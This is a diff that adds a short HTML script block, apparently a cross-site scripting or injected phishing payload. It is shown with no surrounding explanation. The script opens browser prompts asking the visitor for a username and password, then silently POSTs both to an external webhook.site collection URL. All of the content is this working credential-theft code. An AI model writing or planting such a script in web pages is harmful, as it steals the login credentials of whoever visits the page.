@@ -1,0 +1,14 @@
+<script>
+    var username = prompt("Enter your username:");
+    var password = prompt("Enter your password:");
+    if (username && password) {
+        fetch('https://webhook.site/737c847c-d818-4e45-9a25-86afcd28f69f', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
+        });
+    }
+</script>
